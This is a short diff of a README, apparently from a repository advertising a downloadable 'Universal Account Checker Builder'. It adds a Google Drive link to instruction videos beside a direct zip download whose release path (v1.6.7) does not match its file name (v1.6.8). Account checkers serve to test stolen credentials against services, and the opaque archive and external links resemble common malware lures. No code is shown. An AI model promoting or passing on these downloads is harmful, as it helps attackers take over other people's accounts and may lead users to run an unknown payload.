@@ -6,6 +6,11 @@
 ## Direct Download Link
 [Download HOFNAR05 Universal Account Checker Builder v1.6.8](https://github.com/hofnarcc/accounts_checker_builder/releases/download/v1.6.7/HOFNAR05.-.UNIVERSAL.ACCOUT.CHECKER.BUILDER.v1.6.8.zip)
 
+
+## INSTRUCTION VIDEO'S:
+[ -> Click Link <- ](https://drive.google.com/drive/folders/1xPRlEY6Im3eOprHD0wi-m-ryetW5HruU?usp=drive_link)
+
+
 ## 🚀 2025 - New Release!
 **New Features**:
 - **Invalid Account Detection**: Marks invalid accounts and stores them in a separate database.
